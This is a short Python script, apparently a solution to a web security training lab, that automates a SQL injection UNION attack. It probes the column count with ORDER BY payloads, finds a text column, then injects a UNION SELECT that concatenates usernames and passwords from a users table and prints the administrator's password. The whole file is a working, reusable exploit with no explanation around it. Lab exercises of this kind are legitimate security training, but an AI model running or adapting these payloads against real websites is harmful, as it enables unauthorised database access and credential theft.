# Lab: SQL injection UNION attack, retrieving multiple values in a single column

import requests
import urllib3
import sys
import re
from urllib.parse import quote
from urllib.parse import unquote
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Proxies = {
    "http" : "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def Request(url, path, query):
    encoded_query = quote(query)
    try:
        r = requests.get(url + path + encoded_query, verify=False, proxies=Proxies, timeout=10 )
    except requests.RequestException:
        return None
    return r

def find_columns(url):
    path = "/filter?category=Clothing%2c+shoes+and+accessories"
    
    # for i in range(1, 20):
    i = 1
    while i < 20:
        sql_query = f"' ORDER BY {i} -- "
        r =  Request(url, path, sql_query)
        if r.status_code != 200:
            i -= 1
            return i
        i += 1
    return None

def exploit_string_field(num_col, url):
    data = "'a'"
    path = "/filter?category=Clothing%2c+shoes+and+accessories"
    
    for i in range(1, num_col + 1):
        payload_list = ['null']* num_col
        payload_list[i-1] = data
        print(payload_list)
        sql_query = f"'UNION SELECT {",".join(payload_list)} -- "
        r =  Request(url, path, sql_query)
        if r.status_code == 200:
            return i
    return False

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Pets'
    sql_payload = f"' UNION SELECT Null, username||'~'||password FROM users -- "
    r =  Request(url, path, sql_payload)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(string=re.compile('.*administrator.*')).split("~", 1)[1]
        print(f"[+] The administrator password is: {admin_password}")
        return True
    return False



if __name__ == '__main__':
    url = input("Enter your Url: ").strip()
    if len(url) == 0:
        print("Enter the url")
        sys.exit(-1)

    print(f"[+] Dumping the number of columns")
    
    num_col =find_columns(url)
    print(f"[+] Number of columns: {num_col}")
    if not num_col:
        print("[-] Can't reterive the columns")
        
    str_column = exploit_string_field(num_col, url)
    if str_column:
        print(f"[+] The string in column is: ({str_column})")
    else:
        print("[-] We are not able to reterive string from the column")
    
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password")